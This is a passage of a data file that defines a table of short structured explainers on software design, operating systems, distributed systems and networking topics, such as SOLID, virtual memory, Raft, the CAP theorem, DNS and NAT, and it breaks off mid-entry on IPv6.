T["design patterns (singleton, observer, factory)"] = {
    "what": "named, reusable solutions to recurring software design problems. The Gang of Four's 1994 book catalogued 23 patterns across creational (singleton, factory, builder), structural (adapter, decorator, facade), and behavioral (observer, strategy, command) categories",
    "how": "a singleton restricts a class to a single instance via a private constructor and a static getInstance method. The factory pattern delegates object creation to a method or class so callers don't depend on concrete types. The observer pattern lets subjects notify multiple subscribers of state changes via a uniform update interface",
    "why": "patterns give teams a shared vocabulary -- saying 'use a strategy here' communicates a precise design without paragraphs of explanation. They also encode hard-won lessons: the patterns favor composition, abstraction, and decoupling, which make codebases easier to evolve",
    "vs": "compared with ad-hoc design, patterns provide proven structures and trade-offs. Compared with frameworks that enforce structure, patterns are guidelines you apply selectively. Patterns can be overused -- treating every class as a candidate for some pattern leads to unnecessary indirection",
    "ex": "in a logging library, the LoggerFactory.getLogger(name) call uses a factory to return a Logger configured by global config. The Logger class itself uses observer to push log events to multiple appenders (console, file, network). Singleton might back the global LogManager",
    "mis": "people overuse the singleton pattern; in modern code, dependency injection of a single instance is almost always preferable because singletons are essentially global state that breaks tests. Another myth is that you must memorize all 23 GoF patterns -- in practice, ten or so cover most use cases",
}
T["SOLID principles"] = {
    "what": "five object-oriented design principles coined by Robert C. Martin: Single Responsibility, Open-Closed, Liskov Substitution, Interface Segregation, and Dependency Inversion. Together they guide developers toward code that is modular, testable, and open to change",
    "how": "Single Responsibility: a class should have one reason to change. Open-Closed: open for extension, closed for modification. Liskov Substitution: subtypes must be substitutable for their base types without breaking callers. Interface Segregation: keep interfaces small and focused. Dependency Inversion: depend on abstractions, not concretions",
    "why": "code that follows SOLID tends to be easier to test, refactor, and reuse. Violations correlate with bugs and changes that ripple through the codebase. Major frameworks like Spring, Angular, and ASP.NET Core are built on Dependency Inversion via DI containers",
    "vs": "compared with no guiding principles, SOLID gives a vocabulary for code reviews. Compared with stricter regimes like Clean Architecture, SOLID is principles rather than structure -- it tells you what good looks like without prescribing a specific layout. Functional programming achieves similar ends through different means (pure functions, algebraic types)",
    "ex": "a class that both fetches users from a database and renders HTML for them violates SRP. Splitting it into UserRepository and UserView lets you test each independently and swap out either without touching the other. The view depends on a simple data interface, not the repository -- that is dependency inversion",
    "mis": "people treat SOLID as universal law; they are heuristics that cost complexity. A small script doesn't need five layers of abstractions. Another misconception is that SOLID applies only to OOP -- the principles translate to functional code via composition and module boundaries",
}
T["dependency injection"] = {
    "what": "a design technique where a class receives its dependencies from outside (typically through constructor parameters) rather than constructing them internally. This decouples the class from concrete implementations and makes substitution straightforward for testing or alternative configurations",
    "how": "instead of new EmailService() inside a constructor, you take EmailService as a parameter and store it. A composition root (a DI container or hand-written wiring) creates concrete instances and passes them to consumers. The class no longer knows or cares how its dependencies are constructed",
    "why": "DI makes code testable -- in tests you pass mock or fake implementations. It supports plugin architectures, environment-specific configurations (dev vs prod databases), and clear ownership of object lifecycles. Spring, Angular, ASP.NET Core, and most modern frameworks revolve around it",
    "vs": "compared with the Service Locator pattern (where classes pull dependencies from a registry), DI makes dependencies explicit in the signature -- callers can see what's needed. Compared with global singletons, DI lets each consumer get its own instance or a shared one as configured by the composition root",
    "ex": "a UserService that depends on UserRepository and EmailNotifier takes both in its constructor: UserService(repo, notifier). In production the composition root passes a real database repository and an SMTP notifier; in tests you pass an in-memory repo and a no-op notifier so tests run fast and don't send real email",
    "mis": "people think DI requires a heavy framework; constructor injection works in any language with no library. Another myth is that DI eliminates all coupling -- you still depend on the interface, just not the concrete class, and the composition root has to know everything",
}
T["test-driven development"] = {
    "what": "a development practice where you write a failing test first, write the minimum production code to pass it, then refactor for cleanliness while keeping tests green. The mantra is red-green-refactor, repeated in short cycles measured in minutes",
    "how": "you start by writing a small test that captures one new behavior. Run it -- it fails because the code doesn't exist yet (red). Write just enough production code to pass (green). Then refactor either the test or the code, knowing the test suite catches regressions instantly. Repeat for the next behavior",
    "why": "TDD produces a comprehensive test suite as a byproduct, supports refactoring with confidence, and forces you to think about the API from a caller's perspective before implementation. Studies suggest TDD reduces defect density at modest cost in development time, and the suite serves as living documentation",
    "vs": "compared with writing tests after the code (test-after), TDD's main difference is using tests as a design tool, not just a verification tool. Compared with Behavior-Driven Development (BDD), TDD operates at the unit level while BDD focuses on user-visible behavior expressed in plain language",
    "ex": "writing a calculator: first test asserts add(2, 3) == 5. Implement add(a, b): return a + b. Next test asserts add(-1, 1) == 0. Already passes -- no change needed. Next, multiply with floating point. Each cycle takes seconds and the suite grows with every behavior you add",
    "mis": "people think TDD requires testing every method; you test behaviors, not implementation details. Another myth is that TDD slows you down -- short term yes, but on multi-month projects the time saved on debugging and regressions usually exceeds the upfront cost",
}

# === TECH: systems ===
T["operating system kernels"] = {
    "what": "the core program of an operating system that runs at the highest privilege level on the CPU. The kernel mediates between hardware and user-space programs, managing CPU scheduling, memory, file systems, devices, and security policies",
    "how": "the kernel runs in a privileged CPU mode (ring 0 on x86) with full hardware access. User programs run in unprivileged mode and request kernel services via system calls, which trap into the kernel through a controlled gate (syscall instruction or interrupt). The kernel validates the request, executes it, and returns",
    "why": "without the kernel's mediation, every program could touch hardware directly, corrupt others' memory, or monopolize CPU. The kernel enforces isolation and fair scheduling, which is what makes a multi-user, multi-tasking system possible. Linux, Windows NT, and XNU (macOS) are the three dominant kernels",
    "vs": "monolithic kernels like Linux put drivers and most services in kernel space for performance. Microkernels like seL4 keep the kernel tiny and run drivers as user-space servers communicating via IPC, trading speed for safety and modularity. Hybrid kernels (Windows NT, XNU) blend the approaches",
    "ex": "when you call read(fd, buf, n) in C, glibc invokes the syscall instruction with arguments in registers. The CPU jumps into the kernel, which finds the file descriptor in the process's table, calls the appropriate file system driver, copies the data into user buf, and returns. The whole round trip is microseconds",
    "mis": "people think the kernel is small -- the Linux kernel has over 30 million lines of code. Another myth is that crashes are usually kernel bugs; modern kernels are remarkably stable, and most user-visible crashes come from buggy drivers or user-space programs",
}
T["virtual memory"] = {
    "what": "an abstraction that gives each process its own private linear address space, larger than physical RAM, mapped to physical memory by the OS and CPU. Processes use virtual addresses that the memory management unit (MMU) translates to physical addresses on the fly",
    "how": "the OS maintains per-process page tables that map fixed-size virtual pages (typically 4KB) to physical frames. The MMU caches recent translations in a TLB. When a process accesses an unmapped page, a page fault interrupts the kernel, which can lazily load the data from disk, allocate a fresh frame, or kill the process",
    "why": "virtual memory enables process isolation (one process can't read another's memory), demand paging (load code only when used), memory overcommit, copy-on-write fork, and memory-mapped files. It is the foundation of modern multitasking; without it, programs would have to coordinate physical addresses",
    "vs": "compared with raw physical addressing, virtual memory adds a translation layer that costs a few cycles per uncached lookup but enables isolation and overcommit. Compared with segmentation (older x86), paging is finer-grained and hardware-friendlier",
    "ex": "two Chrome tabs each see address 0x400000 as the start of their executable, but those addresses map to different physical frames so they cannot interfere. When fork() runs, the child shares the parent's pages copy-on-write -- pages aren't actually copied until one process writes to them",
    "mis": "people equate swap space with virtual memory; swap is just one mechanism within virtual memory's broader role. Another myth is that more virtual memory makes programs faster -- it makes more memory available, but if the working set exceeds RAM, paging thrashes the disk and performance collapses",
}
T["process scheduling"] = {
    "what": "the kernel's mechanism for deciding which runnable process or thread runs on each CPU at each moment. The scheduler aims to balance throughput, fairness, latency, and priority, and reschedules many times per second across all cores",
    "how": "the scheduler maintains run queues of runnable threads. On a timer interrupt or a blocking syscall, it picks the next thread by policy: round-robin, fixed priority, or fair-share. Linux's CFS (Completely Fair Scheduler) tracks per-thread virtual runtime and picks the thread with the lowest accumulated time, weighted by nice value",
    "why": "scheduling determines whether your laptop feels responsive, your server hits its tail latency target, or your game stutters. It is also where real-time constraints meet best-effort workloads -- audio buffers must be filled within milliseconds while batch jobs wait their turn",
    "vs": "compared with cooperative scheduling (used by some user-space coroutine systems), preemptive scheduling guarantees a misbehaving thread cannot hog the CPU. Compared with batch schedulers like SLURM, OS schedulers operate at sub-millisecond granularity and lack global cluster awareness",
    "ex": "Linux's CFS uses a red-black tree keyed by virtual runtime. When a thread blocks on I/O it leaves the tree; when it wakes, it re-enters with a virtual runtime that gives it priority to absorb the wakeup latency. nice -n 19 makes a process accumulate virtual runtime ~10x faster, deprioritizing it",
    "mis": "people think higher priority always means faster execution; it means more CPU shares, but a single CPU still serializes work. Another myth is that the scheduler chooses the 'best' thread -- modern multi-core schedulers worry about cache locality and NUMA, not just priority",
}
T["file systems (ext4, NTFS, APFS, ZFS)"] = {
    "what": "software that organizes how data is stored and retrieved on a block device. A file system defines the on-disk structures (superblocks, inodes, directory entries, allocation maps) and the algorithms that maintain them under writes, crashes, and concurrent access",
    "how": "writes update an in-memory cache and a journal or log so that a crash leaves the system in a recoverable state. ext4 uses block-group inode tables and a journal; NTFS uses an MFT with B-trees; APFS and ZFS are copy-on-write -- they never overwrite live data, instead writing new blocks and atomically swapping pointers",
    "why": "file system choice affects reliability, performance, snapshot capabilities, and feature set. Copy-on-write systems like ZFS and APFS provide instant snapshots and detect silent corruption via checksums. Journaling systems like ext4 prioritize speed and broad compatibility",
    "vs": "ext4 is fast and ubiquitous on Linux but has weaker integrity guarantees than ZFS. NTFS has rich ACLs and alternate streams but is Windows-centric. APFS is optimized for SSDs and instant snapshots on macOS. ZFS adds end-to-end checksums, native RAID, and pooled storage at higher RAM cost",
    "ex": "ZFS detects bit-rot by storing a Merkle tree of checksums. When you read a block, ZFS verifies it against the parent's checksum and, if it fails and you have redundancy, repairs the block automatically from a mirror. ext4 has no such check -- it trusts the disk",
    "mis": "people assume modern disks are reliable enough that file system features don't matter, but silent bit-rot and firmware bugs are real and rare events that compound on multi-petabyte arrays. Another myth is that defragmentation matters on SSDs -- it doesn't, and excessive defrag wastes write cycles",
}
T["containers vs virtual machines"] = {
    "what": "two ways to run isolated workloads on shared hardware. A virtual machine runs a full guest OS on top of a hypervisor that virtualizes hardware. A container shares the host kernel and isolates processes via Linux namespaces and cgroups, packaging just the application and its userland",
    "how": "VMs use a hypervisor (KVM, Xen, ESXi, Hyper-V) that exposes virtual CPUs, memory, disks, and NICs to each guest, which boots its own kernel. Containers use namespaces to give a process its own view of the filesystem, network, PIDs, and users, plus cgroups to cap CPU and memory. The container starts in milliseconds because there's no kernel boot",
    "why": "containers slashed deployment overhead from minutes (boot a VM) to seconds (start a process). They enabled microservices at scale, reproducible local dev environments via Docker, and Kubernetes-orchestrated clusters. VMs remain essential for stronger isolation between untrusted tenants",
    "vs": "VMs offer hardware-level isolation, can run arbitrary OSes, and are the right choice for multi-tenant clouds. Containers are far lighter (10s of MB vs GBs), start in milliseconds, and pack many more on a host -- but a kernel exploit can escape any container on that host",
    "ex": "a single 16-core server might run 4 VMs, each booting Ubuntu and running a small stack -- about 4 GB RAM each. The same server running containers can comfortably host 50+ containerized services, each in its own image, sharing the host kernel and using a few hundred MB apiece",
    "mis": "people think containers are mini-VMs; they are isolated processes, not virtualized hardware. Another myth is that containers are inherently insecure -- with seccomp, AppArmor, user namespaces, and read-only root, well-configured containers are quite secure, just not as strongly isolated as VMs",
}
T["microservices architecture"] = {
    "what": "an architectural style that decomposes an application into small, independently deployable services, each owning a focused business capability and communicating via lightweight protocols (HTTP, gRPC, message queues). Each service has its own data store and release cadence",
    "how": "you split the system along bounded contexts -- user identity, billing, inventory -- and deploy each as a separate process, often containerized and orchestrated by Kubernetes. Services communicate via APIs, are versioned independently, and emit events on a bus for downstream consumers. Each service team owns its lifecycle end to end",
    "why": "microservices let teams deploy without coordinating with the rest of the org, scale hot services independently, and pick the best tech per service. They are the dominant pattern at companies like Netflix, Uber, and Amazon, where org structure (Conway's Law) makes a single monolith impractical",
    "vs": "compared with monoliths, microservices trade in-process simplicity for distributed-systems complexity -- network failures, partial outages, distributed tracing, schema evolution. Compared with a service-oriented architecture (SOA) of the 2000s, microservices are smaller, lighter, and shun heavyweight ESBs",
    "ex": "a typical e-commerce stack might split into User, Catalog, Cart, Order, Payment, Notification, and Inventory services. Adding a holiday-only feature lives entirely in Catalog and a temporary CampaignService -- no other team needs to deploy. Black Friday traffic scales Order and Payment without scaling User",
    "mis": "people think microservices are always better; for small teams or simple domains they create more pain than they solve. Another myth is that microservices guarantee scalability -- a poorly factored microservice mesh can be slower than a well-tuned monolith because every call now crosses the network",
}
T["monolithic architecture tradeoffs"] = {
    "what": "an architecture in which the application is built as a single deployable unit -- one codebase, one process, one database -- with all features tightly integrated. The Linux kernel, classic Rails apps, and most CRUD systems start as monoliths",
    "how": "code is organized into modules but everything links into one binary or runtime. Function calls between modules are in-process and microsecond-fast. Deployments push the whole binary at once. Data lives in shared tables, with foreign keys enforcing consistency",
    "why": "monoliths are dramatically simpler to develop, test, deploy, and reason about -- there is no network in the middle, no distributed transactions, no version skew. For small teams or early products, the productivity advantage is enormous, and many famous companies (Shopify, Stack Overflow) run very profitable monoliths",
    "vs": "compared with microservices, monoliths trade per-team autonomy for in-process speed and simpler ops. Compared with modular monoliths (well-bounded modules in one binary), an unbounded monolith risks becoming a 'big ball of mud' where every change touches every module",
    "ex": "Stack Overflow famously runs the entire site on a small fleet of monolithic .NET servers backed by a single SQL Server cluster. Performance is exceptional -- median page render under 50ms -- and the operational footprint is a tiny fraction of equivalent microservices",
    "mis": "people equate 'monolith' with 'legacy' or 'bad'. Modern monoliths with strict module boundaries are excellent default architectures. Another myth is that monoliths can't scale -- vertical scale is enormous, and read replicas plus careful sharding take you very far",
}
T["event-driven architecture"] = {
    "what": "an architectural style where components communicate by producing and consuming events -- immutable records of facts that have happened. Components are decoupled: producers don't know who consumes, and consumers don't know who produces",
    "how": "producers emit events to a broker (Kafka, AWS SNS, NATS) on named topics. Consumers subscribe to topics and react by updating state, calling other systems, or producing further events. Many systems use event sourcing where events are the source of truth and current state is a projection over the event log",
    "why": "event-driven systems naturally scale horizontally because consumers can be added without changing producers. They give a complete audit trail, support time-travel debugging, and make it cheap to add new features that derive from existing events",
    "vs": "compared with request-response, events decouple in time and identity -- producers don't wait, and new consumers can join later. Compared with choreographed REST workflows, events centralize the source of truth in the broker and avoid tangled service-to-service dependencies",
    "ex": "an order-placed event triggers inventory deduction, payment capture, fraud screening, email confirmation, and analytics -- all in parallel, each handled by an independent consumer. Adding loyalty-points crediting later means just adding another consumer; existing services don't change",
    "mis": "people think events guarantee ordering; only events on the same Kafka partition (or analogous primitive) are ordered. Another myth is that EDA is asynchronous-only -- request-response APIs and events coexist in most real systems and serve different needs",
}
T["message queues (Kafka, RabbitMQ)"] = {
    "what": "middleware that decouples producers from consumers by buffering messages between them. Kafka is a distributed append-only log designed for high-throughput streaming; RabbitMQ is a traditional broker built around AMQP queues with rich routing semantics",
    "how": "Kafka writes messages to per-partition log files and consumers track their own offsets, allowing replay and parallel consumption. RabbitMQ accepts messages into exchanges, which route to queues based on bindings, and consumers ack each message; once acked, it is removed",
    "why": "queues smooth out traffic spikes, decouple teams, and add reliability via durable storage. Kafka in particular has become the backbone for event streaming, log aggregation, and stream processing at companies handling trillions of messages per day",
    "vs": "Kafka is optimized for high-throughput, replayable streams with long retention -- ideal for event sourcing and analytics. RabbitMQ excels at complex routing patterns, low-latency RPC-style messaging, and per-message acknowledgements -- ideal for task queues and traditional async workflows",
    "ex": "a ride-sharing app pushes every GPS update from millions of drivers into a Kafka topic partitioned by driver ID. Multiple consumer groups read in parallel: one updates the live map, another computes ETAs, another archives to S3 for ML training -- all without coordinating",
    "mis": "people think Kafka and RabbitMQ are interchangeable; they have different strengths and choosing the wrong one leads to pain. Another myth is that queues guarantee exactly-once delivery; both natively give at-least-once, and exactly-once requires idempotent consumers or transactional integration",
}
T["distributed consensus (Raft, Paxos)"] = {
    "what": "algorithms that let a group of machines agree on a single value (or sequence of values) even when some machines crash, messages are lost, or networks partition. Paxos was the original 1990s formulation; Raft (2014) is a more understandable redesign with the same guarantees",
    "how": "nodes elect a leader by exchanging votes. The leader replicates each new entry to followers; once a majority acknowledges, the entry is committed and applied to the state machine. If the leader dies, a new election picks the most up-to-date follower. Quorums (typically a majority) ensure safety despite minority failures",
    "why": "consensus is the foundation of every reliable distributed system: etcd, Consul, ZooKeeper, CockroachDB, and TiKV all use Raft or Paxos to keep replicated state consistent. Without consensus, you cannot have a reliable distributed lock, leader election, or strongly consistent database",
    "vs": "Paxos is famously hard to implement correctly because the spec leaves many details to the engineer. Raft splits the algorithm into leader election, log replication, and safety, making it dramatically easier to teach and implement correctly. Both provide the same theoretical guarantees",
    "ex": "Kubernetes stores its cluster state in etcd, a Raft-backed store. When you kubectl apply a deployment, the API server proposes the change to etcd's Raft leader, which replicates it to followers; once a majority commit, the state is durable and visible to all controllers",
    "mis": "people think consensus algorithms tolerate any failure; they tolerate up to (n-1)/2 node failures in a cluster of n. Another myth is that Paxos and Raft are slow -- they add a couple of network round trips per write, which is acceptable for control planes but too slow for high-frequency data",
}
T["the CAP theorem"] = {
    "what": "a result by Eric Brewer (2000) stating that a distributed data store cannot simultaneously provide all three of: Consistency (every read returns the latest write), Availability (every request gets a response), and Partition tolerance (the system keeps working despite network partitions)",
    "how": "during a network partition the system must choose: either refuse some requests to preserve consistency (CP) or serve them and risk returning stale data (AP). Because partitions are inevitable in real networks, the practical choice is CP vs AP -- 'CA' systems just lack partition tolerance",
    "why": "CAP forces architects to make explicit, principled choices. Banking systems lean CP -- they would rather refuse a transaction than risk inconsistent balances. Shopping carts lean AP -- they accept your write into a local replica and reconcile later, because losing the cart is worse than minor inconsistency",
    "vs": "consistency models form a spectrum, not a binary. CAP's 'C' is linearizability; weaker consistency (eventual, causal, read-your-writes) opens design space. PACELC (Daniel Abadi) extends CAP: even without partitions, there is a tradeoff between Latency and Consistency",
    "ex": "DynamoDB defaults to AP -- it always responds, even from a single replica, and reconciles via vector clocks. Spanner is CP and uses TrueTime to serialize writes globally; if a partition isolates a quorum, the minority side stops accepting writes",
    "mis": "people read CAP as 'pick two', but partition tolerance is non-negotiable in practice. Another myth is that CAP applies to every system -- it specifically governs replicated data stores during partitions, not single-node databases or stateless services",
}
T["sharding databases"] = {
    "what": "horizontally partitioning data across multiple database servers so each holds only a subset. The shard key (e.g., user_id) determines which shard a row lives on, and queries route to the right shard. It scales beyond what a single machine can hold or serve",
    "how": "you choose a shard key and a sharding function -- range-based, hash-based, or directory-based. The application or a routing layer (Vitess, Citus, Mongo's mongos) hashes or looks up the key and forwards reads and writes to the responsible shard. Resharding moves data when shard counts change",
    "why": "single-machine databases hit limits in storage, IOPS, and connection counts. Sharding lets you scale to billions of rows or millions of QPS by adding machines. Major sites (Twitter, Instagram, Discord) use heavily sharded MySQL, Postgres, or Cassandra under the hood",
    "vs": "compared with read replicas (which scale read throughput by copying everything), sharding scales write throughput and storage by splitting the data. Compared with vertical scaling (bigger boxes), sharding has no upper bound but adds enormous operational complexity around joins, transactions, and rebalancing",
    "ex": "Discord shards messages by channel_id. A message in channel 12345 goes to shard hash(12345) mod 1024. Reading a channel's history hits one shard; cross-channel queries either fan out or are answered by a separate aggregation system. Adding shards uses consistent hashing to minimize data movement",
    "mis": "people think sharding solves all scale problems; it makes joins and cross-shard transactions far harder. Another myth is that you can defer sharding indefinitely -- by the time a single DB is overwhelmed, retrofitting sharding into a schema with cross-table foreign keys is a multi-quarter project",
}
T["caching strategies"] = {
    "what": "techniques for storing frequently accessed data closer to the consumer (in memory, on the edge) to avoid expensive recomputation or backend round trips. Common patterns include cache-aside, read-through, write-through, and write-behind",
    "how": "in cache-aside, the app checks the cache first; on miss, it queries the source and populates the cache. In read-through, the cache library queries the source itself on miss. Write-through writes to cache and source synchronously; write-behind buffers writes and flushes asynchronously, trading durability for write latency",
    "why": "caches turn 100ms database queries into 1ms memory lookups, slashing latency and offloading the source. CDNs cache static assets at the edge; Redis caches database results; CPU caches accelerate every memory access. Without caching, today's web simply wouldn't work at scale",
    "vs": "cache-aside is the most common because it gives the app full control over what's cached; the downside is duplicated logic at every call site. Read-through hides the miss path inside the cache library but ties you to it. Write-behind is fastest but loses recent writes on crash",
    "ex": "a product page hits Redis with key product:42. On miss, the app reads from PostgreSQL, stores the result with a 5-minute TTL, and returns. 99% of subsequent requests hit Redis in under a millisecond. When inventory updates, the app invalidates the cache key so the next request refreshes",
    "mis": "people think caching is purely an optimization; it changes correctness too -- stale cache entries, thundering herds on TTL expiry, and split-brain with multiple cache nodes are real failure modes. Phil Karlton's quip stands: 'There are only two hard things: cache invalidation and naming things'",
}
T["load balancing algorithms"] = {
    "what": "the policies a load balancer uses to distribute incoming requests across backend servers. Common algorithms include round-robin, least-connections, weighted variants, hash-based (for sticky sessions), and adaptive policies that track latency or CPU",
    "how": "round-robin rotates through the backend list. Least-connections sends to the backend with fewest active connections, useful when request durations vary. Consistent hashing maps requests to backends so the same key always lands on the same backend, enabling cache locality. Power-of-two-choices picks two random backends and sends to the less loaded one -- nearly optimal with minimal state",
    "why": "load balancing is what turns a fleet of servers into a single fault-tolerant service. It distributes load evenly, removes failed nodes from rotation, and handles deploys by draining traffic. Every cloud platform, every CDN, and every horizontally scaled service depends on it",
    "vs": "round-robin is simple but ignores backend load -- a slow backend gets the same share as a fast one. Least-connections is better under heterogeneous load. Random with power-of-two-choices is nearly as good as least-connections without the bookkeeping. Consistent hashing is the right choice when cache locality matters",
    "ex": "Nginx in front of three backends with weights 5/3/2 sends roughly 50%, 30%, 20% of requests respectively -- useful when servers have different capacity. Adding a fourth backend with weight 2 reweights the distribution automatically without restarting clients",
    "mis": "people think 'round-robin' guarantees even load; if requests vary in cost, round-robin can leave some backends overloaded while others idle. Another myth is that more LBs = more resilience -- a single LB is often the right answer with active-passive failover; multiple active LBs add coordination problems",
}

# === TECH: networks ===
T["the OSI model"] = {
    "what": "a seven-layer conceptual framework for network communication standardized by ISO in 1984. The layers from bottom to top are Physical, Data Link, Network, Transport, Session, Presentation, and Application -- each layer providing services to the one above and using services from the one below",
    "how": "data flows down the stack on send and up on receive. Each layer adds its own header (encapsulation): the application's bytes get a TCP header at L4, an IP header at L3, an Ethernet header at L2, then become electrical signals at L1. The receiver's stack peels off headers in reverse",
    "why": "OSI gave the industry a shared vocabulary for discussing networking. Even though no real protocol exactly implements all seven layers, terms like 'layer 4 load balancer' and 'layer 7 routing' are universal. The model also clarified separation of concerns -- physical media changes don't break TCP, and TCP changes don't break HTTP",
    "vs": "the TCP/IP model that actually runs the internet has four layers: Link, Internet, Transport, Application -- collapsing OSI's top three into one. OSI's Session and Presentation layers (encryption, serialization) are typically implemented inside the application or in libraries like TLS",
    "ex": "loading a web page: the browser sends an HTTP GET (L7), TCP segments it (L4), IP routes packets through routers (L3), the local Wi-Fi link carries Ethernet frames (L2), and the radio sends modulated signals (L1). Each layer is independently replaceable -- swap Wi-Fi for fiber and the upper layers don't notice",
    "mis": "people memorize the seven layers as if they map directly to real protocols; they're a teaching aid more than a strict architecture. Another myth is that OSI is obsolete -- the *protocols* are obsolete, but the model lives on as a vocabulary",
}
T["TCP vs UDP"] = {
    "what": "two transport-layer protocols. TCP (Transmission Control Protocol) is connection-oriented, reliable, and ordered. UDP (User Datagram Protocol) is connectionless, best-effort, and message-oriented -- it just sends datagrams without guarantees",
    "how": "TCP establishes a connection via a three-way handshake (SYN, SYN-ACK, ACK), assigns sequence numbers, retransmits lost packets, and uses sliding-window flow control plus congestion control. UDP just stuffs the payload into a header with source/dest ports and a checksum and sends it -- the application handles whatever reliability it needs",
    "why": "TCP enables reliable streams for HTTP, email, file transfer -- anywhere you need every byte to arrive in order. UDP enables low-latency apps that prefer dropped packets to retransmission delays: voice and video calls, online games, DNS, and now QUIC (which builds reliability over UDP)",
    "vs": "TCP guarantees delivery and order at the cost of round trips, head-of-line blocking, and connection setup overhead. UDP has no setup, no retransmission, and no ordering -- you get what arrives, potentially out of order or duplicated. UDP is faster in good conditions and degrades gracefully in bad ones if the app handles loss",
    "ex": "Zoom and Google Meet send audio over UDP because a 50ms hiccup is better than waiting for a retransmitted packet that arrives 300ms late and is now stale. HTTP/3 runs over QUIC over UDP precisely to escape TCP's head-of-line blocking on lossy links",
    "mis": "people think UDP is unreliable in the sense of 'broken'; it's unreliable in the sense of 'no built-in guarantees'. Many UDP-based protocols (DNS, QUIC, RTP) layer their own reliability on top. Another myth is that TCP is always slower; on a fast wired LAN, the difference is negligible",
}
T["HTTP/1.1 vs HTTP/2 vs HTTP/3"] = {
    "what": "three generations of HTTP. HTTP/1.1 (1997) is text-based and uses one request per TCP connection (or pipelining, rarely used). HTTP/2 (2015) introduces binary framing, multiplexing, and header compression over TCP. HTTP/3 (2022) replaces TCP with QUIC over UDP",
    "how": "HTTP/1.1 sends headers as ASCII and serializes requests on the connection. HTTP/2 splits requests into frames on logical streams over a single TCP connection, with HPACK compressing headers. HTTP/3 uses QUIC streams that are independently reliable, so a lost packet on one stream doesn't block others",
    "why": "each version reduced page load time. HTTP/2 ended the era of domain sharding (creating multiple subdomains to parallelize requests). HTTP/3 fixes TCP's head-of-line blocking, which dominated tail latency on lossy mobile networks; Cloudflare reports 12% faster page loads on average",
    "vs": "HTTP/1.1 is simple and human-readable but slow due to per-connection serialization. HTTP/2 multiplexes over one TCP connection but inherits TCP's head-of-line blocking when packets are lost. HTTP/3 over QUIC eliminates that blocking and bundles TLS into a single 0-RTT or 1-RTT handshake",
    "ex": "loading a media-rich page over HTTP/2 fetches 100 assets through one TCP connection without head-of-line stalls between resources. On HTTP/3, even a 5% packet loss rate doesn't pause unrelated streams, so a slow image doesn't stall the page's CSS",
    "mis": "people think HTTP/3 is just HTTP/2 over UDP; QUIC is a new transport with its own congestion control, stream semantics, and connection migration (your phone can switch from Wi-Fi to cellular without breaking the connection). Another myth is that HTTP/3 always wins -- on lossless wired networks, HTTP/2 can match it",
}
T["DNS resolution"] = {
    "what": "the process of translating a human-readable domain like example.com into an IP address. DNS is a globally distributed hierarchical naming system with root servers, top-level domain servers, authoritative name servers, and caching resolvers",
    "how": "your device asks a recursive resolver (often run by your ISP or 1.1.1.1, 8.8.8.8). The resolver may already have the answer cached. Otherwise it asks a root server (which returns the .com TLD servers), then the .com server (which returns example.com's authoritative servers), then the authoritative server, which returns the A record. The result is cached per its TTL",
    "why": "DNS makes the internet usable. It also enables traffic engineering (geo-routing via Anycast), failover (short TTLs), email routing (MX records), and modern features like DNSSEC for authenticity and DoH/DoT for privacy. Every web request begins with at least one DNS lookup",
    "vs": "compared with a hosts file, DNS scales to billions of names with delegated authority. Compared with newer naming systems like ENS (Ethereum Name Service), DNS is centralized and politically influenced but extraordinarily fast and reliable in practice",
    "ex": "typing google.com in a browser: your OS checks its cache; on miss, it asks 8.8.8.8. 8.8.8.8 may have google.com cached; if not, it traverses root -> .com -> google.com -> returns 142.250.x.x. Round trip is typically 10-50ms cold, sub-millisecond when cached",
    "mis": "people think DNS lookups are instant; cold lookups can take hundreds of milliseconds and are a real source of latency. Another myth is that flushing your DNS cache always helps; it just forces re-resolution, which can be slower if upstream resolvers haven't refreshed their entries",
}
T["BGP and internet routing"] = {
    "what": "Border Gateway Protocol (BGP) is the routing protocol that exchanges reachability information between autonomous systems (ASes) -- the independently administered networks that make up the internet. It's how your packets find their way across the global internet",
    "how": "each AS announces which IP prefixes it can reach, and propagates announcements from neighbors. Routers select the best path per prefix using policies (local preference, AS path length, MED). BGP converges over seconds-to-minutes after topology changes, much slower than intra-AS protocols like OSPF",
    "why": "BGP is the glue that turns ~75,000 ASes into one internet. Outages and misconfigurations in BGP cause some of the largest internet incidents -- Facebook's 6-hour outage in 2021 traced to a BGP withdrawal, and route leaks have repeatedly knocked services offline globally",
    "vs": "compared with intra-AS protocols (OSPF, IS-IS) that are link-state and converge in milliseconds, BGP is path-vector and policy-driven, prioritizing administrative control over speed. RPKI is layered on top to add cryptographic origin validation",
    "ex": "Cloudflare announces 1.1.1.1 from many points of presence using Anycast over BGP. Your packets are routed by BGP to whichever PoP has the shortest AS path, giving low-latency DNS without DNS-level geo-routing",
    "mis": "people think the internet has central authority for routing; it doesn't. Each AS makes local decisions based on policy. This decentralization is the reason BGP can be hijacked: anyone can announce someone else's prefixes, which is what RPKI tries to fix",
}
T["NAT and IPv4 exhaustion"] = {
    "what": "Network Address Translation lets many devices on a private network share a single public IPv4 address by rewriting IP addresses and ports as packets cross the boundary. NAT became ubiquitous because IPv4's 4.3 billion addresses ran out around 2011-2019 across the regional registries",
    "how": "your home router assigns private addresses (10.x.x.x, 192.168.x.x) to devices. Outbound packets get their source rewritten to the router's public IP and a translated source port; the router maps the (private addr, port) to the public port in a NAT table. Return traffic looks up the table and rewrites back",
    "why": "NAT extended the lifespan of IPv4 by a decade or more, but it broke end-to-end connectivity, complicated peer-to-peer protocols (requiring STUN, TURN, ICE), and added stateful boxes that can fail. It is the main reason VoIP, gaming, and video calls need traversal helpers",
    "vs": "compared with IPv6, NAT is a workaround; IPv6's enormous address space (3.4 x 10^38) makes every device globally addressable again. Carrier-Grade NAT (CGNAT) extends NAT one level higher, sharing one public IP across thousands of customers, with even worse implications for traceability and protocols",
    "ex": "your home network has a laptop at 192.168.1.20:54321 talking to youtube.com. The router rewrites the source to 73.x.x.x:48000 and remembers the mapping. Return packets to 73.x.x.x:48000 are translated back to 192.168.1.20:54321. YouTube has no idea you're behind NAT",
    "mis": "people think NAT is a security feature; it provides only side-effect filtering of unsolicited inbound traffic, which a stateful firewall does explicitly and better. Another myth is that IPv4 is dead -- as of 2026, well over half of internet traffic still flows over IPv4 due to NAT and CGNAT",
}
T["IPv6 adoption"] = {
    "what": "IPv6 is the successor to IPv4, with 128-bit addresses (vs 32-bit) yielding 3.4 x 10^38 unique addresses. It also adds streamlined headers, built-in IPsec, and stateless address autoconfiguration. Adoption has grown from under 5% in 2014 to over 45% of Google's traffic by 2026",
